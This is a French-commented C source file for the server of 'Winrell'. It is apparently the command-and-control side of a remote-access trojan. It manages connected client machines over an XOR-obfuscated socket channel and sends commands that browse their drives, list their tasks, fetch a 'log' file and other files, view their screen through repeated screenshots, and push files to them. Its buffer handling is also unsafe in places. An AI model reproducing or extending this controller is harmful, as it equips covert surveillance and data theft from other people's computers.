//=============================================================================
// Projet : Winrell (server)
// Fichier : server.c
//
//=============================================================================

#include "server.h"


//=============================================================================
//                    Fonction de gestion des traitements
// (connexion d'un client, envoie/reception de données, deconnexion d'un client...)
//=============================================================================

void app()
{
   SOCKET sock = init_connection();
   char buffer[BUF_SIZE];
   /* the index for the array */
   actualClientsNumber = 0;
   int max = sock;
   int id = 0; // même si 0, le premier id sera 1, car on va incrémenter id avant d'affecter

   fd_set rdfs;

   while(1)
   {
      int i = 0;
      FD_ZERO(&rdfs);

      /* add the connection socket */
      FD_SET(sock, &rdfs);

      /* add socket of each client */
      for(i = 0; i < actualClientsNumber; i++)
      {
         FD_SET(clients[i].sock, &rdfs);
      }

      if(select(max + 1, &rdfs, NULL, NULL, NULL) == -1)
      {
         //perror("select()");
         exit(errno);
      }
      
      if(FD_ISSET(sock, &rdfs))
      {
         /* new client */
         SOCKADDR_IN csin = { 0 };
         size_t sinsize = sizeof csin;
         int csock = accept(sock, (SOCKADDR *)&csin, &sinsize);
         if(csock == SOCKET_ERROR)
         {
            //perror("accept()");
            continue;
         }

         /* after connecting the client sends its name */
         if(read_socket(csock, buffer) == -1)
         {
            /* disconnected */
            continue;
         }

         /* what is the new maximum fd ? */
         max = csock > max ? csock : max;

         FD_SET(csock, &rdfs);

         Client c = { csock };
         id++;
         c.id = id; // on affecte au client un id unique (à lui seul)
         strncpy(c.name, buffer, BUF_SIZE - 1);
         /* Initialisation */
         c.recv_file = FALSE;
         c.explore_drive = FALSE;
         c.task_list_opened = FALSE;
         c.update_config = FALSE;
         c.todo_list_opened = FALSE;
         c.show_screen = FALSE;
         /* ajout/sauvegarde dans la liste/tableau globale des clients */
         clients[actualClientsNumber] = c;
         /* Incrémentation du nombre de clients */
         actualClientsNumber++;
         
         /* Ajout à la listeView des clients */
         ajouterALaListView(buffer, strlen(buffer), inet_ntoa(csin.sin_addr));
         /* Envoie du text pour la bar des status. */
         sprintf(buffer, "%d client(s) en ligne", actualClientsNumber);
         SetWindowText(hwStatusBar, buffer);
         /* Affichage d'un message bulbe */
         if (!IS_MAIN_WINDOW_ACTIVE)
         {
            char message[200];
            sprintf(message, "%s vient de se connecter !", c.name);
            afficherTrayIconBallon(NOM_APP, message, 2000, TRUE);
         }
      }
      else
      {
         int i;
         for(i = 0; i < actualClientsNumber; i++)
         {
            /* a client is talking & we don't receive or send files */
            if(FD_ISSET(clients[i].sock, &rdfs) && !clients[i].recv_file && !clients[i].send_file)
            {
               int c = read_client(&clients[i], buffer);
               
               /* client disconnected */
               if(c == 0)
               {
                  disconnect_client(i, TRUE);
               }
               //else
               //{
                  //send_message_to_all_clients(clients, actualClientsNumber, buffer);
               //}
               break;
            }
         }
      }
   }

   clear_clients(clients, actualClientsNumber);
   end_connection(sock);
}

//=============================================================================
//           Fonctions d'initialisation/nettoyage des sockets windows
//                    (Nécessaire juste sous windows)
//=============================================================================

void init()
{
    #ifdef WIN32
        WSADATA wsa;
        int err = WSAStartup(MAKEWORD(2, 2), &wsa);
        if(err < 0)
        {
            //puts("WSAStartup failed !");
            exit(EXIT_FAILURE);
        }
    #endif
}

void end()
{
    #ifdef WIN32
        WSACleanup();
    #endif
}

//=============================================================================
//        Fonctions d'initialisation/fermeture de la connexion socket
//                       (lancement du serveur)
//=============================================================================

int init_connection()
{
   SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
   //printf("La socket %d est maintenant ouverte en mode TCP/IP\n", sock);
   char tmp[200];
   sprintf(tmp, "La socket %d est maintenant ouverte en mode TCP/IP", sock);
   appendToRichConsole("information", tmp);
   
   SOCKADDR_IN sin = { 0 };

   if(sock == INVALID_SOCKET)
   {
      //perror("socket()");
      exit(errno);
   }

   sin.sin_addr.s_addr = htonl(INADDR_ANY);
   sin.sin_port = htons(PORT);
   sin.sin_family = AF_INET;

   if(bind(sock,(SOCKADDR *) &sin, sizeof sin) == SOCKET_ERROR)
   {
      //perror("bind()");
      exit(errno);
   }

   //printf("Listage du port %d...\n", PORT);
   sprintf(tmp, "Listage du port %d...", PORT);
   appendToRichConsole("information", tmp);
   if(listen(sock, MAX_CLIENTS) == SOCKET_ERROR)
   {
      //perror("listen()");
      exit(errno);
   }

   return sock;
}

void end_connection(int sock)
{
   closesocket(sock);
}

//=============================================================================
//             Fonctions de suppression des sockets des clients
//
//=============================================================================

void clear_clients(Client *clients, int actualClientsNumber)
{
    int i = 0;
    for(i = 0; i < actualClientsNumber; i++)
    {
        closesocket(clients[i].sock);
    }
}

void remove_client(Client *clients, int to_remove, int *actualClientsNumber)
{
   /* we remove the client in the array */
   memmove(clients + to_remove, clients + to_remove + 1, (*actualClientsNumber - to_remove - 1) * sizeof(Client));
   /* number client - 1 */
   (*actualClientsNumber)--;
   ListView_DeleteItem(hwClientsList, to_remove); /* On efface l'élément de la ListView */
   /* Envoie du text pour la bar des status. */
   char buffer[100];
   sprintf(buffer, "%d client(s) en ligne", *actualClientsNumber);
   SetWindowText(hwStatusBar, buffer);
}

//=============================================================================
//                     Fonctions d'envoie/récéption
//
//=============================================================================

void send_message_to_all_clients(Client *clientsTab, int actualClientsNumber, char *buffer)
{
   appendToRichConsole("send to all", buffer);
   
   int i = 0;
   char message[BUF_SIZE], tmp[200];
   message[0] = 0;
   
   lvItemActuel = -1; //pour eviter tout problème
   
   for(i = 0; i < actualClientsNumber; i++)
   {
       if (clients[i].recv_file)
       {
          sprintf(tmp, "%s est en train d'envoyer un fichier !", clients[i].name);
          appendToRichConsole("information", tmp);
          //MessageBox(hwFenetre, tmp, NOM_APP, MB_OK | MB_ICONWARNING);
       }
       else if (clients[i].send_file)
       {
          sprintf(tmp, "%s reçoit un fichier !", clients[i].name);
          appendToRichConsole("information", tmp);
          //MessageBox(hwFenetre, tmp, NOM_APP, MB_OK | MB_ICONWARNING);
       }
       else
          write_client(&clients[i], buffer, FALSE);
       
       /* S'il y'a un client suivant */
       if (i < actualClientsNumber - 1)
       {
          sprintf(message, "Client Suivant (%s) ?", clients[i+1].name);
          if (MessageBox(hwFenetre, message, NOM_APP, MB_YESNO | MB_ICONQUESTION) == IDNO)
             break;
       }
   }
   
   //printf("envoye a tous : %s\n", buffer);
}

int read_socket(SOCKET sock, char *buffer)
{
   int n = 0;

   if((n = recv(sock, buffer, BUF_SIZE - 1, 0)) < 0)
   {
      //perror("recv()");
      // if recv error we disonnect the client
      return 0;//n = 0;
   }
       
   buffer[n] = 0;
   
   if (CRYPT_DECRYPT) // #if CRYPT_DECRYPT == TRUE
   {
       //Crypt(buffer, strlen(buffer), CRYPT_KEY, strlen(CRYPT_KEY)); // décryptage
       xor(buffer, CRYPT_KEY); // décryptage
   } // #endif
   
   //printf("recu : %s\n", buffer);
   appendToRichConsole("recv", buffer);

   return n;
}

int read_client(Client *client, char *buffer)
{
   int n = 0;

   appendToRichConsole("from", (*client).name);
      
   if((n = recv((*client).sock, buffer, BUF_SIZE - 1, 0)) < 0)
   {
      //perror("recv()");
      /* if recv error we disonnect the client */
      return 0;//n = 0;
   }
       
   buffer[n] = 0;
      
   if (CRYPT_DECRYPT) // #if CRYPT_DECRYPT == TRUE
   {
       //Crypt(buffer, strlen(buffer), CRYPT_KEY, strlen(CRYPT_KEY)); // décryptage
       xor(buffer, CRYPT_KEY); // décryptage
   } // #endif
   //printf("recu : %s\n", buffer);
   appendToRichConsole("recv", buffer);
      
   if ((*client).explore_drive == TRUE)
   {
      // si se sont des drives/partitions + on ne reçoit aucune erreur
      if (buffer[n-2] == '\\' && strcmp(buffer, "[No Drives]")) // ex partition: C:\\ (-2 car y'aura un '|' après), n = la taille du buffer
      {
         // on les affiche
         setExploreResult(buffer, '|', TRUE);
      }
      else if (strstr(buffer, "F_Info>") != NULL) // si nn si se sont des informations d'un fichier/dossier
      {
          // on les affichee
          setInformationsResult(buffer, '|', '>');
      }
   }
   else if ((*client).todo_list_opened == TRUE)
   {
      // s'il y'a des ToDo
      if (buffer[0] == '[') // ex ToDo List: [0]60|Commande
      {
         if (strcmp(buffer, "[No ToDo]"))
         {
            // on les affiche
            setToDoResult(buffer, '|');
         }
         // si nn
         else
         {
            // on vide la listeView
            ListView_DeleteAllItems(hwToDoList);
            // on vide la StatusBar
            SetWindowText(hwToDoListStatusBar, "");
         }
      }
   }

   return n;
}

void write_client(Client *client, char *buffer, BOOL appendToConsole)
{
   if (appendToConsole)
      appendToRichConsole("send", buffer); // si je la met après le if (erreur d'écriture qui survient à cause d'une collision avec la réception)
   
   // copie de la commande pour cryptage
   char commandeCopy[BUF_SIZE];
   lstrcpy(commandeCopy, buffer);
   
   if (CRYPT_DECRYPT) // #if CRYPT_DECRYPT == TRUE
   {
       //Crypt(commandeCopy, strlen(commandeCopy), CRYPT_KEY, strlen(CRYPT_KEY)); // cryptage
       xor(commandeCopy, CRYPT_KEY); // cryptage
       // décryptage pour voir ce que le client recevera + détécter si le message a été tranché ou nn
       char commandeCopyDecrypted[BUF_SIZE];
       lstrcpy(commandeCopyDecrypted, commandeCopy);
       //Crypt(commandeCopyDecrypted, strlen(commandeCopyDecrypted), CRYPT_KEY, strlen(CRYPT_KEY));
       xor(commandeCopyDecrypted, CRYPT_KEY);
       // on affiche ce qu'on a décrypté au cas ou il est différent de ce qu'on a envoyé (plus précisament, s'il est tranché)
       if (appendToConsole && strcmp(buffer, commandeCopyDecrypted))
       {
           appendToRichConsole("send decrypt error /!\\", commandeCopyDecrypted);
           return; // on annule l'envoie de la commande
       }
   } // #endif
   
   // Vérifiaction avant envoie
   char *ptBuffer = NULL, cmdPart[2][200];
   if ((ptBuffer = strstr(buffer, "Recv_File")) != NULL)
   {
      int lenCmd = strlen("Recv_File") + 1; // +1 de l'espace ' '
      int lenMax = strlen(buffer) - lenCmd;
      strncpy(cmdPart[1], ptBuffer + lenCmd, lenMax);
      cmdPart[1][lenMax] = '\0';
      // si le fichier n'existe pas
      if (!verifierExistenceFichier(cmdPart[1]))
      {
         //MessageBox(hwFenetre, "Fichier introuvable !", NOM_APP, MB_OK | MB_ICONWARNING);
         appendToRichConsole("annulation", "Fichier introuvable !");
         return; /* on ne doit pas envoyer la commande (on quitte la fonction) */
      }
      // si nn si fichier vide
      else if (tailleFichier(cmdPart[1]) == 0)
      {
         appendToRichConsole("annulation", "file_size = 0");
         return; /* on ne doit pas envoyer la commande (on quitte la fonction) */
      }
   }
   
   // envoie
   if(send((*client).sock, commandeCopy, strlen(commandeCopy), 0) < 0)
   {
      //perror("send()");
      exit(errno);
   }
   
   // Vérification si Envoie/Réception de fichier
   if (strstr(buffer, "Recv_File") != NULL) // Si envoie pour le serveur / réception pour le client
   {
      DWORD dwThreadId;
      lstrcpy((*client).file_name, cmdPart[1]); // on indique le fichier à envoyer
      (*client).recv_file = TRUE; // on indique que le client va recevoir un fichier
      HANDLE hThreadEnvoie = CreateThread(NULL, 0, Envoie, (LPVOID)client, 0, &dwThreadId); // Lancement
   }
   else if ((ptBuffer = strstr(buffer, "Send_File")) != NULL) // Si nn si réception (pour le serveur)
   {
      int lenCmd = strlen("Send_File") + 1; // +1 de l'espace ' '
      int lenMax = strlen(buffer) - lenCmd;
      strncpy(cmdPart[1], ptBuffer + lenCmd, lenMax);
      cmdPart[1][lenMax] = '\0';
      // Gestion des différents raccourcis de nom de fichiers
      if (!strcmp(cmdPart[1], "log"))
         strcpy(cmdPart[1], "lecteur.wsk");
      else if (!strcmp(cmdPart[1], "explore") || strstr(cmdPart[1], "explore->"))
         strcpy(cmdPart[1], "explore.wsk");
      else if (!strcmp(cmdPart[1], "tasks"))
         strcpy(cmdPart[1], "tasks.wsk");
      else if (!strcmp(cmdPart[1], "config"))
         strcpy(cmdPart[1], "config.wsk");
      // On récupère le nom du programme si jamais il contient un chemin/path
      char *pt = recupNomDuProgramme(cmdPart[1]);
      strcpy((*client).file_name, pt); // on indique le fichier à recevoir
      free(pt);
      // On indique que la prochaine parole du client, un recv() pr nous, sera un envoie des données d'un fichier
      (*client).send_file = TRUE;
      // Lancement
      DWORD dwThreadId;
      HANDLE hThreadTelechargement = CreateThread(NULL, 0, Telechargement, (LPVOID)client, 0, &dwThreadId);
   }
   else if ((ptBuffer = strstr(buffer, "Send_Pict")) != NULL)
   {
      char *pt;
      pt = get_time(1);
      sprintf(cmdPart[1], "%s-%s.jpg", (*client).name, pt); // on génère un nom pour l'image
      strcpy((*client).file_name, cmdPart[1]); // on indique le fichier à recevoir
      free(pt);
      // On indique que la prochaine parole du client/recv() sera un envoie des données d'un fichier
      (*client).send_file = TRUE;
      // Lancement
      DWORD dwThreadId;
      HANDLE hThreadTelechargement = CreateThread(NULL, 0, Telechargement, (LPVOID)client, 0, &dwThreadId);
   }
   
   //printf("envoye : %s\n", buffer);
}

//=============================================================================
//                 Fonction de récéption de fichier
//
//=============================================================================

int recv_file(int clientId)
{
    int clientIndice, clientsNumberSave = actualClientsNumber;
    UploadDownload download = { 0 };
    download.isDownload = TRUE;
    
    // Récupération du client index
    clientIndice = getClientIndexById(clientId);
    
    char send_str [MAX_SEND_BUF]; /* message to be sent to server */
    FILE * f = NULL; /* file handle for receiving file */
    ssize_t sent_bytes, rcvd_bytes, rcvd_file_size, rcvd_file_size_save = 0;
    int recv_count; /* count of recv() calls */
    char recv_str[MAX_RECV_BUF], tmp[200]; /* buffer to hold received data */
    size_t send_strlen; /* length of transmitted string */
    
    recv_count = 0; /* number of recv() calls required to receive the file */
    rcvd_file_size = 0; /* size of received file */
    
    // On récupère la taille du fichier
    int n = recv(clients[clientIndice].sock, recv_str, MAX_RECV_BUF, 0);
    recv_str[n] = 0; // fin de chaine
    long file_size;
    if(strstr(recv_str, "No such File or Directory") != NULL)
    {
       appendToRichConsole("erreur", recv_str);
       goto recv_file_end;
    }
    else
       file_size = atol(recv_str);
    // on vérifie que la taille != 0
    if(file_size == 0)
    {
       appendToRichConsole("file_size", recv_str);
       if (clients[clientIndice].explore_drive) // si on explore le drive du client, on n'oublie pas de vider la liste view
       {
           ListView_DeleteAllItems(hwListeExploration); // on vide la listeView (si elle est déjà vide aucun prob.)
           SetWindowText(hwExploreStatusBar, ""); // on vide la statusbar
       }
       goto recv_file_end;
    }
    /* attempt to create file to save received data. 0644 = rw-r--r-- */
    int iFile = 1;
    char old_file_name[200];
    lstrcpy(old_file_name, clients[clientIndice].file_name); // on sauvegarde l'ancien nom
    while (1)
    {
       if (SetFileAttributes(clients[clientIndice].file_name, FILE_ATTRIBUTE_NORMAL)) // si le fichier existe déjà
       {
          char new_file_name[200];
          sprintf(new_file_name, "(%d)%s", iFile, old_file_name); // nouveau nom
          lstrcpy(clients[clientIndice].file_name, new_file_name); // on change le nom du fichier pour réesayer
          iFile++;
       }
       else // s'il n'existe pas, c'est bon, on le crée
       {
          // On ouvre/crée le fichier en mode écriture binaire
          if ( (f = fopen(clients[clientIndice].file_name, "wb")) == NULL )
          {
             //perror("error creating file");
             return -1;
          }
          
          break; // on quitte la boucle
       }
    }
    // saving downlaod fileSize
    sizeToString(file_size, tmp);
    lstrcpy(download.fileSize, tmp);
    // saving download fileName
    lstrcpy(download.fileName, clients[clientIndice].file_name);
    // saving download client
    lstrcpy(download.client, clients[clientIndice].name);
    // saving download startAt
    char *time = get_time(2);
    lstrcpy(download.startAt, time);
    free(time);
    // saving download endAt
    lstrcpy(download.endAt, "-");
    // setting download state
    lstrcpy(download.state, "Downloading...");
    // setting download iProgress
    int iProgress = 0;
    download.iProgress = 0;
    // setting download details
    lstrcpy(download.details, "-");
    // Add download to Downloads/Uploads List
    int position = AddToDownloadsUploadsListView(hwDownloadsUploadsListView, download);
    
    // On affiche la Downloads/Uploads List (si Auto Show == TRUE + on ne visionne pas l'écran du client + elle n'est pas déjà visible)
    if (AUTOSHOW_DOWNLOAD_UPLOAD_LIST && !clients[clientIndice].show_screen && !IsWindowVisible(hwFenDownloadsUploads))
        ShowWindow(hwFenDownloadsUploads, SW_SHOW & SW_MAXIMIZE);
    
    /* continue receiving until ? (data or close) */
    int end = 0;
    
    appendToRichConsole("start downloading", download.fileName);
    
    // On renvoie une reponse (pour le début de la récéption)
    char reponse[] = "OK";
    send(clients[clientIndice].sock, reponse, strlen(reponse), 0);
    
    // we start dowloading, and if clients[clientIndice].sock return a number < 0 this mean that the client have disconnect
    while(!end)
    {
       if ((rcvd_bytes = recv(clients[clientIndice].sock, recv_str, MAX_RECV_BUF, 0)) < 0 )
       {// si on entre içi c'est que le client s'est déconnecté
          sprintf(tmp, "%d bytes received in %d recv(s)", rcvd_file_size, recv_count);
          appendToRichConsole("cuted downloading", tmp);
          
          // setting download state
          lstrcpy(download.state, "Error");
          // setting download endAt
          char *endTime = get_time(2);
          lstrcpy(download.endAt, endTime);
          free(endTime);
          // setting download details
          lstrcpy(download.details, tmp);
          // updating download infos
          UpdateDownloadUploadProgress(hwDownloadsUploadsListView, download, position, TRUE, TRUE);
          
          // on déconnecte le client (en l'enlève de la list etc..)
          disconnect_client(clientIndice, FALSE);
          
          fclose(f); /* close file */
          
          return 0;
       }
       
       recv_count++;
       rcvd_file_size += rcvd_bytes;
       
       //if (IsWindowVisible(hwFenDownloadsUploads)) // Si la fenêtre d'uploads/downloads est visible
       //{ // cette vérification ne fait que ralentir notre téléchargement ainsi que l'update de la liste d'uploads/downloads
           // calcul du taux de progression
           iProgress = getIntProgress(file_size, rcvd_file_size);
           if (download.iProgress < iProgress && diffMoreThanOneMegabits(rcvd_file_size, rcvd_file_size_save))
           {
               // setting download iProgress
               download.iProgress = iProgress;
               // updating download infos
               UpdateDownloadUploadProgress(hwDownloadsUploadsListView, download, position, FALSE, FALSE);
               rcvd_file_size_save = rcvd_file_size;
           }
       //}
       
       // écriture des données reçu dans le fichier
       if (fwrite(recv_str, sizeof(char), rcvd_bytes, f) < 0 )
       {
           //perror("error writing to file");
           return -1;
       }
          
       // Si fin de fichier
       if (rcvd_file_size >= file_size)
          end = 1;
    }
    fclose(f); /* close file*/
    
    // Affichage du résultat
    //printf("Client Received: %d bytes in %d recv(s)\n", rcvd_file_size, recv_count);
    sprintf(tmp, "%d bytes received in %d recv(s)", rcvd_file_size, recv_count);
    sprintf(recv_str, "%s %s", download.fileName, tmp);
    appendToRichConsole("finish downloading", recv_str);
    // setting download state
    lstrcpy(download.state, "Done");
    // setting download endAt
    char *endTime = get_time(2);
    lstrcpy(download.endAt, endTime);
    free(endTime);
    // setting download details
    lstrcpy(download.details, tmp);
    // setting download iProgress
    download.iProgress = 100;
    // updating download infos
    UpdateDownloadUploadProgress(hwDownloadsUploadsListView, download, position, TRUE, TRUE);
    
    // mise à jour de l'indice du client (peut être qu'un client avant nous s'est déconnecté)
    clientIndice = updateClientIndexById(clientId, clientIndice, &clientsNumberSave);
    
    // Si Explore Drive + récéption du fichier explore
    if (clients[clientIndice].explore_drive && strstr(download.fileName, "explore.wsk") != NULL)
    {
        // lecture du fichier explore
        int tailleF = tailleFichier(download.fileName);
        char contenu[tailleF];
        lireFichier(download.fileName, contenu);
        
        // Suppression du fichier
        DeleteFile(download.fileName);
        
        // Traitement et affichage
        setExploreResult(contenu, '|', FALSE);
    }
    // Si nn si taskList ouverte + récéption du fichier tasks
    else if (clients[clientIndice].task_list_opened && strstr(download.fileName, "tasks.wsk") != NULL)
    {
        // lecture du fichier
        int tailleF = tailleFichier(download.fileName);
        char contenu[tailleF];
        lireFichier(download.fileName, contenu);
        
        // Suppression du fichier
        DeleteFile(download.fileName);
        
        // Traitement et affichage
        setTasksResult(contenu, '|');
    }
    // Si nn si Update Config ouverte + récéption du fichier config
    else if (clients[clientIndice].update_config && strstr(download.fileName, "config.wsk") != NULL)
    {
        // lecture du fichier
        int tailleF = tailleFichier(download.fileName);
        char contenu[tailleF];
        lireFichier(download.fileName, contenu);
        
        // Suppression du fichier
        DeleteFile(download.fileName);
        
        // Traitement et affichage
        setConfigResult(contenu, '\r'); // '\r' et non '\n' car un retour à la ligne == '\r\n' (en utilisant une fonction de lecture windows api)
    }
    else if (clients[clientIndice].show_screen)
    {
        // Suppression de l'ancienne/dernière image avant (si elle existe biensur)
        if (strlen(clients[clientIndice].show_screen_infos.imagePath) > 0 && !clients[clientIndice].show_screen_infos.saveImages)
            DeleteFile(clients[clientIndice].show_screen_infos.imagePath);
        // Sauvegarde/Changement du nom de l'image
        sprintf(clients[clientIndice].show_screen_infos.imagePath, "%s\\%s", APP_PATH, download.fileName);
        // On redessine la fenêtre
        InvalidateRect(clients[clientIndice].show_screen_infos.hwnd, NULL, FALSE);
    }
    
    recv_file_end: // étiquette
    
    // le client à fini de nous envoyer le fichier comme on a fini de le recevoir
    clients[clientIndice].send_file = FALSE;
    
    return rcvd_file_size;
}

//=============================================================================
//                    Fonction d'envoie de fichier
//
//=============================================================================

int send_file(int clientId)
{
   int clientIndice, clientsNumberSave = actualClientsNumber;
   UploadDownload upload = { 0 };
   upload.isUpload = TRUE;
    
   // Récupération du client index
   clientIndice = getClientIndexById(clientId);
   
   ssize_t read_bytes, /* bytes read from local file */
   sent_bytes, /* bytes sent to connected socket */
   sent_file_size,
   sent_file_size_save = 0; 
   int sent_count; /* how many sending chunks, for debugging */
   char send_buf[MAX_SEND_BUF], tmp[200]; /* max chunk size for sending file */
   
   FILE *f = NULL; /* file handle for reading local file*/
   
   sent_count = 0;
   sent_file_size = 0;
 
   /* attempt to open requested file for reading */
   if( (f = fopen(clients[clientIndice].file_name, "rb")) == NULL) /* can't open requested file */
   {
      //perror("error opening file");
      return -1;
   }
   else /* open file successful */
   {
      // send file size
      long file_size = tailleFichier(clients[clientIndice].file_name);
      sprintf(send_buf, "%d", file_size);
      send(clients[clientIndice].sock, send_buf, strlen(send_buf), 0);
      // wait for/get response
      recv(clients[clientIndice].sock, send_buf, BUF_SIZE - 1, 0);
      
      // saving upload fileSize
      sizeToString(file_size, tmp);
      lstrcpy(upload.fileSize, tmp);
      // saving upload fileName
      lstrcpy(upload.fileName, clients[clientIndice].file_name);
      // saving upload client
      lstrcpy(upload.client, clients[clientIndice].name);
      // saving upload startAt
      char *time = get_time(2);
      lstrcpy(upload.startAt, time);
      free(time);
      // saving upload endAt
      lstrcpy(upload.endAt, "-");
      // setting upload state
      lstrcpy(upload.state, "Uploading...");
      // setting upload iProgress
      int iProgress = 0;
      upload.iProgress = 0;
      // setting upload details
      lstrcpy(upload.details, "-");
      // Add upload to Downloads/Uploads List
      int position = AddToDownloadsUploadsListView(hwDownloadsUploadsListView, upload);
      
      // On affiche la Downloads/Uploads List (si Auto Show == TRUE + on ne visionne pas l'écran du client + elle n'est pas déjà visible)
      if (AUTOSHOW_DOWNLOAD_UPLOAD_LIST && !clients[clientIndice].show_screen && !IsWindowVisible(hwFenDownloadsUploads))
          ShowWindow(hwFenDownloadsUploads, SW_SHOW & SW_MAXIMIZE);
      
      //printf("Sending file: %s\n", file_name);
      appendToRichConsole("start uploading", upload.fileName);
      
      // we start uploading, and if clients[clientIndice].sock return a number < 0 this mean that the client have disconnect
      while( (read_bytes = fread(send_buf, sizeof(char), MAX_RECV_BUF, f)) > 0 )
      {
         if( (sent_bytes = send(clients[clientIndice].sock, send_buf, read_bytes, 0)) < read_bytes )
         {// si on entre içi c'est que le client s'est déconnecté
            //perror("send error");
            sprintf(tmp, "%d bytes sent in %d send(s)", sent_file_size, sent_count);
            appendToRichConsole("cuted uploading", tmp);
            
            // setting upload state
            lstrcpy(upload.state, "Error");
            // setting upload endAt
            char *endTime = get_time(2);
            lstrcpy(upload.endAt, endTime);
            free(endTime);
            // setting upload details
            lstrcpy(upload.details, tmp);
            // updating upload infos
            UpdateDownloadUploadProgress(hwDownloadsUploadsListView, upload, position, TRUE, TRUE);
            
            // on déconnecte le client (en l'enlève de la list etc..)
            disconnect_client(clientIndice, FALSE);
            
            return -1;
         }
         
         sent_count++;
         sent_file_size += sent_bytes;
         
         //if (IsWindowVisible(hwFenDownloadsUploads)) // Si la fenêtre d'uploads/downloads est visible
         //{ // cette vérification ne fait que ralentir notre upload ainsi que l'update de la liste d'uploads/downloads
           // calcul du taux de progression
           iProgress = getIntProgress(file_size, sent_file_size);
           if (upload.iProgress < iProgress && diffMoreThanOneMegabits(sent_file_size, sent_file_size_save))
           {
               // setting upload iProgress
               upload.iProgress = iProgress;
               // updating upload infos
               UpdateDownloadUploadProgress(hwDownloadsUploadsListView, upload, position, FALSE, FALSE);
               sent_file_size_save = sent_file_size;
           }
       //}
      }
      
      fclose(f); /* close file */
      
      // Affichage du résultat
      //printf("Done with this client. Sent %d bytes in %d send(s)\n", sent_file_size, sent_count);
      sprintf(tmp, "%d bytes sent in %d send(s)", sent_file_size, sent_count);
      sprintf(send_buf, "%s %s", upload.fileName, tmp);
      appendToRichConsole("finish uploading", send_buf);
      // setting upload state
      lstrcpy(upload.state, "Done");
      // setting upload endAt
      char *endTime = get_time(2);
      lstrcpy(upload.endAt, endTime);
      free(endTime);
      // setting upload details
      lstrcpy(upload.details, tmp);
      // setting upload iProgress
      upload.iProgress = 100;
      // updating download infos
      UpdateDownloadUploadProgress(hwDownloadsUploadsListView, upload, position, TRUE, TRUE);
      
      // mise à jour de l'indice du client (peut être qu'un client avant nous s'est déconnecté)
      clientIndice = updateClientIndexById(clientId, clientIndice, &clientsNumberSave);
      
   } /* end else */

   // le client à fini de recevoir le fichier comme on a fini de le lui envoyer
   clients[clientIndice].recv_file = FALSE;
   
   return sent_count;
}

//=============================================================================
//                Fonction qui permet de déconnecter un client
//
//=============================================================================

void disconnect_client(int clientIndice, BOOL closeSocket)
{
    char buffer[BUF_SIZE];
    SOCKET sock;
    
    // on sauvegarde la socket pour la fermer après
    sock = clients[clientIndice].sock;
    // on sauvegarde le nom (pour dire qui s'est déconnecté)
    strncpy(buffer, clients[clientIndice].name, BUF_SIZE - 1);
    // on sauvegarde l'id du client actuellement séléctionné (lvItemActuel) pour vérifier si c'est lui qui s'est déco ou pas
    int clientId = clients[lvItemActuel].id;
    // on enleve les infos du client avant de le déconnecter (pour éviter une double déconnexion)
    remove_client(clients, clientIndice, &actualClientsNumber);
    // déconnexion
    if (closeSocket)
       closesocket(sock);
    // Mise à jour de l'id du client séléctionné
    //(si c'est lui qui s'est déco lvItemActuel sera == -1, si nn lvItemActuel sera mise à jour grace à l'id)
    lvItemActuel = getClientIndexById(clientId);
    // on affiche qui s'est déconnecté
    strncat(buffer, " s'est déconnecté !", BUF_SIZE - strlen(buffer) - 1);
    appendToRichConsole("information", buffer);
                  
    /* Affichage d'un message bulbe */
    if (!IS_MAIN_WINDOW_ACTIVE)
        afficherTrayIconBallon(NOM_APP, buffer, 2000, TRUE);
        
    //send_message_to_all_clients(clients, actualClientsNumber, buffer);
}
